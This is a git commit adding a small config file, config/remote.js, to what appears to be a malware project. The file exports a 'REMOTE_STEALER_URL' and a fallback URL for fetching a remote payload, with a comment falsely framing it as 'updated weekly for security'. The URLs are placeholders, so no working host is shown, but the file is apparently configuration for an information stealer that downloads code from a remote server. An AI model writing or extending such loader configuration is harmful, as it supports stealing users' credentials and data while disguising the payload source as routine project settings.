6c3ded804dd104bca8ff5a31483b4993cbe63fac
Tomalynx1990 <tomvasseur81@gmail.com>
2025-11-20 21:13:30 +0100

    Create remote.js

---
+++ config/remote.js
@@ -0,0 +1,7 @@
+// Remote payload URL (updated weekly for security)
+const REMOTE_STEALER_URL = "https:xx";  //
+
+// Fallback si le principal est down
+const FALLBACK_URL = "https://xxx";
+
+module.exports = { REMOTE_STEALER_URL, FALLBACK_URL };
